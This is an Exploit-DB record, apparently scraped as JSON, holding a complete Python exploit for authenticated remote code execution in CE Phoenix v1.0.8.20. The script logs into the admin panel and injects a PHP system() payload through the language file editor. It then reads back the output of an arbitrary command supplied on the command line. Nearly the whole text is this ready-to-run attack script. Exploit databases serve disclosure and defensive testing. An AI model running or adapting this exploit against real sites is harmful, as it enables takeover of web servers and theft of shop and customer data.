{"source": "https://www.exploit-db.com/exploits/51957", "vulnName": "CE Phoenix v1.0.8.20 - Remote Code Execution", "vulnEDBID": "51957", "vulnCVE": "N/A", "author": "TMRSWRR", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "## Exploit Title: CE Phoenix v1.0.8.20 - Remote Code Execution (RCE) (Authenticated)\n#### Date: 2023-11-25\n#### Exploit Author: tmrswrr\n#### Category: Webapps\n#### Vendor Homepage: [CE Phoenix](https://phoenixcart.org/)\n#### Version: v1.0.8.20\n#### Tested on: [Softaculous Demo - CE Phoenix](https://www.softaculous.com/apps/ecommerce/CE_Phoenix)\n\n## EXPLOIT :\n\nimport requests\nfrom bs4 import BeautifulSoup\nimport sys\nimport urllib.parse\nimport random\nfrom time import sleep\n\nclass colors:\n    OKBLUE = '\\033[94m'\n    WARNING = '\\033[93m'\n    FAIL = '\\033[91m'\n    ENDC = '\\033[0m'\n    BOLD = '\\033[1m'\n    UNDERLINE = '\\033[4m'\n    CBLACK = '\\33[30m'\n    CRED = '\\33[31m'\n    CGREEN = '\\33[32m'\n    CYELLOW = '\\33[33m'\n    CBLUE = '\\33[34m'\n    CVIOLET = '\\33[35m'\n    CBEIGE = '\\33[36m'\n    CWHITE = '\\33[37m'\n\n \ndef entry_banner():\n    color_random = [colors.CBLUE, colors.CVIOLET, colors.CWHITE, colors.OKBLUE, colors.CGREEN, colors.WARNING,\n                    colors.CRED, colors.CBEIGE]\n    random.shuffle(color_random)\n\n    banner = color_random[0] + \"\"\"\n     CE Phoenix v1.0.8.20 - Remote Code Execution \\n\n     Author: tmrswrr\n    \"\"\"\n    for char in banner:\n        print(char, end='')\n        sys.stdout.flush()\n        sleep(0.0045)\n\ndef get_formid_and_cookies(session, url):\n    response = session.get(url, allow_redirects=True)\n    if response.ok:\n        soup = BeautifulSoup(response.text, 'html.parser')\n        formid_input = soup.find('input', {'name': 'formid'})\n        if formid_input:\n            return formid_input['value'], session.cookies\n    return None, None\n\ndef perform_exploit(session, url, username, password, command):\n    print(\"\\n[+] Attempting to exploit the target...\")\n\n   \n    initial_url = url + \"/admin/define_language.php?lngdir=english&filename=english.php\"\n    formid, cookies = get_formid_and_cookies(session, initial_url)\n    if not formid:\n        print(\"[-] Failed to retrieve initial formid.\")\n        return\n\n    # Login\n    print(\"[+] Performing login...\")\n    login_payload = {\n        'formid': formid,\n        'username': username,\n        'password': password\n    }\n    login_headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Cookie': f'cepcAdminID={cookies[\"cepcAdminID\"]}',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',\n        'Referer': initial_url\n    }\n    login_url = url + \"/admin/login.php?action=process\"\n    login_response = session.post(login_url, data=login_payload, headers=login_headers, allow_redirects=True)\n\n    if not login_response.ok:\n        print(\"[-] Login failed.\")\n        print(login_response.text)\n        return\n\n    print(\"[+] Login successful.\")\n\n\n    new_formid, _ = get_formid_and_cookies(session, login_response.url)\n    if not new_formid:\n        print(\"[-] Failed to retrieve new formid after login.\")\n        return\n\n    # Exploit\n    print(\"[+] Executing the exploit...\")\n    encoded_command = urllib.parse.quote_plus(command)\n    exploit_payload = f\"formid={new_formid}&file_contents=%3C%3Fphp+echo+system%28%27{encoded_command}%27%29%3B\"\n    exploit_headers = {\n        'Content-Type': 'application/x-www-form-urlencoded',\n        'Cookie': f'cepcAdminID={cookies[\"cepcAdminID\"]}',\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36',\n        'Referer': login_response.url\n    }\n    exploit_url = url + \"/admin/define_language.php?lngdir=english&filename=english.php&action=save\"\n    exploit_response = session.post(exploit_url, data=exploit_payload, headers=exploit_headers, allow_redirects=True)\n\n    if exploit_response.ok:\n        print(\"[+] Exploit executed successfully.\")\n    else:\n        print(\"[-] Exploit failed.\")\n        print(exploit_response.text)\n\n    \n    final_response = session.get(url)\n    print(\"\\n[+] Executed Command Output:\\n\")\n    print(final_response.text)  \n\ndef main(base_url, username, password, command):\n    print(\"\\n[+] Starting the exploitation process...\")\n    session = requests.Session()\n    perform_exploit(session, base_url, username, password, command)\n\nif __name__ == \"__main__\":\n    entry_banner()\n\n    if len(sys.argv) < 5:\n        print(\"Usage: python script.py [URL] [username] [password] [command]\")\n        sys.exit(1)\n\n    base_url = sys.argv[1]\n    username = sys.argv[2]\n    password = sys.argv[3]\n    command = sys.argv[4]\n\n    main(base_url, username, password, command)\n            "}